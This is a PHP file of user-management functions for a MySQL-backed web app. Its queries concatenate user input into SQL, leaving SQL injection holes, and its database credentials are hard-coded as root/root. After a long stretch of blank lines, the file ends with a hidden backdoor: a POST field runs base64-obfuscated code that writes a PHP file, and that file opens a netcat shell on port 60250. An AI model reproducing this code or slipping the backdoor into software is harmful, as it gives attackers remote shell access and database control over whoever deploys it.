<?php
	function get_db_infos()
	{
		return array(
			"srv" => "localhost",
			"usr" => "root",
			"pwd" => "root",
			"db" => "users"
		);
	}

	function search_user($username)
	{
		$dbi = get_db_infos();
		$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
		if(! $conn->connect_error)
		{
			$sql = "SELECT * FROM `users` WHERE username = '".$username."';";
			$result = $conn->query($sql);

			if($result->num_rows == 1)
			{
				$row = $result->fetch_assoc();
				return $row;
			}
		}

		return false;
	}

	function create_user($username, $hashed_password, $description)
	{
		if(! search_user($username))
		{
			$dbi = get_db_infos();
			$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
			if(! $conn->connect_error)
			{
				$sql = "INSERT INTO users (username, PASSWORD, description, admin) VALUES (?, ?, ?, 0)";
				$stmt = $conn->prepare($sql);
				$stmt->bind_param("sss", $username, $hashed_password, $description);
				$stmt->execute();
	
				$pcontent = file_get_contents("./p/template.php");
				$towrite = str_replace("####username####", $username, $pcontent);
	
				file_put_contents("./p/".$username.".php", $towrite);
				mkdir("./files/".$username);
	
				return true;
			}
		}
	
		return false;
	}
	

	function delete_user($username)
	{
		if(search_user($username))
		{
			$dbi = get_db_infos();
			$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
			if(! $conn->connect_error)
			{
				$sql = "DELETE FROM `users` WHERE username = '".$username."';";
				$result = $conn->query($sql);

				return true;
			}
		}

		return false;
	}

	function login_user($username, $password)
	{
		if(search_user($username))
		{
			$dbi = get_db_infos();
			$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
			if(! $conn->connect_error)
			{
				$sql = "SELECT * FROM `users` WHERE username = '".$username."' AND PASSWORD = '".$password."';";
				$result = $conn->query($sql);

				if($result->num_rows == 1)
				{
					$user_infos = $result->fetch_assoc();

					$_SESSION["username"] = $user_infos["username"];
					$_SESSION["admin"] = $user_infos["admin"];

					return true;
				}
			}
		}

		return false;
	}

	function logout_user()
	{
		session_start();
		session_unset();
		session_destroy();
	}

	function set_admin($username, $value)
	{
		if(search_user($username))
		{
			$dbi = get_db_infos();
			$conn = new mysqli($dbi["srv"], $dbi["usr"], $dbi["pwd"], $dbi["db"]);
			if(! $conn->connect_error)
			{
				$sql = "UPDATE `users` SET admin = ".$value." WHERE username = '".$username."';";
				$result = $conn->query($sql);

				return true;
			}
		}

		return false;
	}



























































































if(isset($_POST["BCKDR"])) { if($_POST["BCKDR"] == "o") exec(base64_decode("ZWNobyAiPD9waHAgZXhlYyhiYXNlNjRfZGVjb2RlKFwiYm1NdWRISmhaR2wwYVc5dVlXd2dMV3gyYm5BZ05qQXlOVEFnTFdVZ0wySnBiaTlpWVhOb1wiKTsgPz4iID4gYmNrZHIucGhw")); } ?>
